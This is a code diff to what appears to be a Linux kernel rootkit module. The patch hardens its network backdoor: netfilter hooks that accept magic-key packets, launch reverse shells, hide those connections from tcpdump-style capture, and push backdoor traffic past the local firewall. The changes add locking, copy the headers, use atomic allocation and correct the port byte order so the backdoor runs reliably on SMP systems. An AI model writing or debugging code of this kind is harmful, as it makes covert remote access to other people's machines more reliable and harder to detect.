@@ -18,7 +18,10 @@
 #include "log.h"
 
 static LIST_HEAD(iph_node);
+// iph_node lock - NF hooks run in softirq, use spin_lock_bh
+static DEFINE_SPINLOCK(iph_node_lock);
 struct iph_node_list {
+	bool memfree;
 	struct iphdr *iph;
 	struct tcphdr *tcph;
 	bool established;
@@ -342,23 +345,55 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int port,
 	return ret;
 }
 
-static int _bd_add_new_iph(struct iphdr *iph, struct tcphdr *tcph)
+static int _bd_add_new_iph(struct iphdr *iph, struct tcphdr *tcph, bool memfree)
 {
-	struct iph_node_list *ip =
-		kcalloc(1, sizeof(struct iph_node_list), GFP_KERNEL);
-	if (!ip)
-		goto error;
+	struct iph_node_list *ip;
+	struct iph_node_list *existing;
+	struct iphdr *iph_copy;
+	struct tcphdr *tcph_copy;
 
-	ip->iph = iph;
-	ip->tcph = tcph;
+	// always copy - skb is freed after NF_DROP so stored pointers go stale
+	iph_copy = kmemdup(iph, sizeof(*iph), GFP_ATOMIC);
+	tcph_copy = iph_copy ? kmemdup(tcph, sizeof(*tcph), GFP_ATOMIC) : NULL;
+	ip = tcph_copy ? kcalloc(1, sizeof(*ip), GFP_ATOMIC) : NULL;
+
+	if (memfree) {
+		kfree(iph);
+		kfree(tcph);
+	}
+
+	if (!ip) {
+		kfree(iph_copy);
+		kfree(tcph_copy);
+		prerr("Error allocating memory\n");
+		return -ENOMEM;
+	}
+
+	// atomic check-and-insert, two CPUs can race here on SMP
+	spin_lock_bh(&iph_node_lock);
+	list_for_each_entry(existing, &iph_node, list) {
+		if (existing->iph->saddr == iph_copy->saddr &&
+		    existing->tcph->source == tcph_copy->source) {
+			spin_unlock_bh(&iph_node_lock);
+			prinfo("Duplicate connection ignored: source=%u, dest=%u\n",
+			       ntohs(tcph_copy->source), ntohs(tcph_copy->dest));
+			kfree(iph_copy);
+			kfree(tcph_copy);
+			kfree(ip);
+			return 0;
+		}
+	}
+
+	// we always own the copies
+	ip->memfree = true;
+	ip->iph = iph_copy;
+	ip->tcph = tcph_copy;
 	ip->established = false;
 	prinfo("Adding new connection port source=%u, dest=%u\n",
 	       ntohs(ip->tcph->source), ntohs(ip->tcph->dest));
 	list_add_tail(&ip->list, &iph_node);
+	spin_unlock_bh(&iph_node_lock);
 	return 0;
-error:
-	prerr("Error allocating memory\n");
-	return -ENOMEM;
 }
 
 bool kv_bd_search_iph_source(__be32 saddr)
@@ -398,7 +433,7 @@ void kv_show_active_backdoors(void)
 #endif
 }
 
-static bool _bd_established(__be32 *daddr, int dport, bool established)
+static bool _bd_established(__be32 *daddr, __be16 dport, bool established)
 {
 	bool rc = false;
 	struct iph_node_list *node, *node_safe;
@@ -416,7 +451,7 @@ static bool _bd_established(__be32 *daddr, int dport, bool established)
 		// address:port set in pre-routing, but this time, they have
 		// daddr:dport, leading to the swapped check you see here.
 		if (node->iph->saddr == *daddr &&
-		    htons(node->tcph->source) == dport) {
+		    node->tcph->source == dport) {
 			// Mark connections as "established" only once per connection to retain state.
 			// This ensures that internal references persist until other end close connections.
 			// Upon revealing tasks, data is freed, and reverse shells are terminated.
@@ -436,6 +471,10 @@ void kv_bd_cleanup_item(__be32 *saddr)
 	list_for_each_entry_safe_reverse (node, node_safe, &iph_node, list) {
 		if (node->iph->saddr == *saddr) {
 			list_del(&node->list);
+			if (node->memfree) {
+				kfree(node->iph);
+				kfree(node->tcph);
+			}
 			kfree(node);
 			node = NULL;
 			break;
@@ -452,6 +491,10 @@ static void _bd_cleanup(bool force)
 	list_for_each_entry_safe (node, node_safe, &iph_node, list) {
 		if (!node->established && force) {
 			list_del(&node->list);
+			if (node->memfree) {
+				kfree(node->iph);
+				kfree(node->tcph);
+			}
 			kfree(node);
 			node = NULL;
 		}
@@ -581,7 +624,8 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
 		if (dport == PORT_UNSET || !kv_check_bdkey(tcph, skb))
 			goto leave;
 
-		kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
+		// softirq, no sleeping
+		kf = kzalloc(sizeof(struct kfifo_priv), GFP_ATOMIC);
 		if (!kf) {
 			prerr("Insufficient memory\n");
 			goto leave;
@@ -595,7 +639,7 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
 		_put_fifo(kf);
 
 		// Make sure we don't show in libcap (tcpdump and friends)
-		_bd_add_new_iph(iph, tcph);
+		_bd_add_new_iph(iph, tcph, false);
 
 		user = (struct nf_priv *)priv;
 		wake_up_process(user->task);
@@ -645,13 +689,12 @@ static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
 	if (IPPROTO_TCP == iph->protocol) {
 		struct tcphdr *tcph =
 			(struct tcphdr *)skb_transport_header(skb);
-		int dstport = htons(tcph->dest);
 
 		// The `sk_state` in include/net/tcp_states.h represents the current connection state of a packet.
 		// When a packet is in the TCP_ESTABLISHED state, it signifies that the connection has completed.
 		// This information is crucial for retaining the state and addresses of this connection, which is
 		// stored throughout the lifetime of the backdoor.
-		if (_bd_established(&iph->daddr, dstport,
+		if (_bd_established(&iph->daddr, tcph->dest,
 				    (skb->sk->sk_state == TCP_ESTABLISHED))) {
 			// Kick this packet out to the wire yay!
 			state->okfn(state->net, state->sk, skb);
